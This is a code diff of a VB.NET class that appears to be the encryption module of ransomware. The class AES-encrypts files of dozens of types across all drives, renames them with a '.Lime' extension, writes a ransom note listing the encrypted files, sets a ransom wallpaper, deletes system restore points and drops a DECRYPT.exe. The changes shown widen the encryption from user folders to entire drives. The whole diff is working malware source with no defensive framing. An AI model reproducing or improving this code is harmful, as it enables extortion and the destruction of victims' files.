@@ -17,16 +17,14 @@ Public Class Encryption
     Public Mynote
     Public Mywallpaper
     Public Shared SPL As String = Main.SPL
-
-
-
+    Public Logs As New System.Text.StringBuilder
 
     Public Sub BeforeAttack()
         Dim T1 As Threading.Thread = New Threading.Thread(AddressOf startAction)
         T1.Start()
     End Sub
 
-    Public Function AES_Encrypt(ByVal bytesToBeEncrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
+    Private Function AES_Encrypt(ByVal bytesToBeEncrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
         On Error Resume Next
         Dim encryptedBytes As Byte() = Nothing
         Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
@@ -50,7 +48,7 @@ Public Class Encryption
         Return encryptedBytes
     End Function
 
-    Public Function CreatePassword(ByVal length As Integer) As String
+    Private Function CreatePassword(ByVal length As Integer) As String
         On Error Resume Next
         Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"
         Dim res As StringBuilder = New StringBuilder()
@@ -62,19 +60,20 @@ Public Class Encryption
         Return res.ToString()
     End Function
 
-    Public Sub EncryptFile(ByVal file As String, ByVal password As String)
+    Private Sub EncryptFile(ByVal file As String, ByVal password As String)
         On Error Resume Next
-        If file <> Application.ExecutablePath AndAlso file <> Main.FULLPATH Then
+        If file <> Application.ExecutablePath AndAlso file <> Main.FULLPATH AndAlso Not file.ToLower.Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower.Replace("system32", Nothing)) Then
             Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
             Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
             Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
             IO.File.WriteAllBytes(file, bytesEncrypted)
             System.IO.File.Move(file, file & ".Lime")
+            Logs.Append(file + Environment.NewLine)
         End If
     End Sub
 
-    Public Sub encryptDirectory(ByVal location As String, ByVal password As String)
+    Private Sub encryptDirectory(ByVal location As String, ByVal password As String)
         On Error Resume Next
         Dim validExtensions = String.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent")
         Dim files As String() = Directory.GetFiles(location)
@@ -91,7 +90,7 @@ Public Class Encryption
         Next
     End Sub
 
-    Public Sub startAction()
+    Private Sub startAction()
         Try
 
 
@@ -101,9 +100,10 @@ Public Class Encryption
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encryption in progress...")
 
-            Dim T1 As New Threading.Thread(AddressOf Progfiles)
-            Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
-            Dim T3 As New Threading.Thread(AddressOf User_Dir)
+            Dim T1 As New Threading.Thread(AddressOf Fix_Drivers)
+            Dim T2 As New Threading.Thread(AddressOf System_Driver)
+            Dim T3 As New Threading.Thread(AddressOf OtherDrivers)
+
             T1.Start((password))
             T2.Start((password))
             T3.Start((password))
@@ -118,10 +118,10 @@ Public Class Encryption
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encrypted")
 
             SetWallpaper()
-            SC()
-            messageCreator()
+            SendScreen()
+            SetMessage()
             DeleteRestorePoints()
-            App()
+            DropDecryptor()
 
 
 
@@ -133,15 +133,14 @@ Public Class Encryption
         Exit Sub
     End Sub
 
-    Public Sub User_Dir(ByVal password As String)
+#Region "Encrypt"
+    Private Sub System_Driver(ByVal password As String)
         On Error Resume Next
-        Dim startPath As String = C_DIR & "Users" & "\" & userName & "\"
-        encryptDirectory(startPath, password)
+        encryptDirectory(C_DIR, password)
         num += 1
-
     End Sub
 
-    Public Sub Fix_Drivers(ByVal password As String)
+    Private Sub Fix_Drivers(ByVal password As String)
         On Error Resume Next
         For Each drive In Environment.GetLogicalDrives
             Dim Driver As DriveInfo = New DriveInfo(drive)
@@ -153,21 +152,27 @@ Public Class Encryption
         num += 1
     End Sub
 
-    Public Sub Progfiles(ByVal password As String)
+    Private Sub OtherDrivers(ByVal password As String)
         On Error Resume Next
-        If Privileges() = True Then
-            encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", password)
-        End If
+        For Each drive In Environment.GetLogicalDrives
+            Dim Driver As DriveInfo = New DriveInfo(drive)
+            If Not Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                Dim DriverPath As String = drive
+                encryptDirectory(DriverPath, password)
+            End If
+        Next
         num += 1
     End Sub
 
-    Public Sub messageCreator()
+#End Region
+
+    Private Sub SetMessage()
         Try
 
             Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
             Dim Message As String = Mynote + Environment.NewLine + "Your ID is [" & Main.HWID + "]"
-            File.WriteAllText(fullpath, Message)
+            File.WriteAllText(fullpath, Message + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString)
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-MSG", Message)
             Process.Start(fullpath)
 
@@ -179,7 +184,7 @@ Public Class Encryption
     Private Const SPI_SETDESKWALLPAPER = 20
     Private Const SPIF_UPDATEINIFILE = &H1
 
-    Sub SetWallpaper()
+    Private Sub SetWallpaper()
         Try
             Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpg"
             File.WriteAllBytes(MYW, Convert.FromBase64String(Mywallpaper))
@@ -194,7 +199,7 @@ Public Class Encryption
         End Try
     End Sub
 
-    Public Sub SC()
+    Private Sub SendScreen()
         On Error Resume Next
         keybd_event(VK_LWIN, 0, 0, 0)
         keybd_event(77, 0, 0, 0)
@@ -221,7 +226,7 @@ Public Class Encryption
     <Runtime.InteropServices.DllImport("Srclient.dll")>
     Public Shared Function SRRemoveRestorePoint(index As Integer) As Integer
     End Function
-    Sub DeleteRestorePoints()
+    Private Sub DeleteRestorePoints()
 
         Try
             Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
@@ -235,7 +240,7 @@ Public Class Encryption
 
     End Sub
 
-    Public Shared Function Privileges() As Boolean
+    Private Shared Function Privileges() As Boolean
         Try
             Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
             Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
@@ -249,11 +254,9 @@ Public Class Encryption
         End Try
     End Function
 
-    Public Sub App()
+    Private Sub DropDecryptor()
         Try
-            Dim S = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "DECRYPT.exe")
             Dim D = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe")
-            IO.File.WriteAllBytes(S, My.Resources.DECF)
             IO.File.WriteAllBytes(D, My.Resources.DECF)
             Process.Start(D)
         Catch ex As Exception
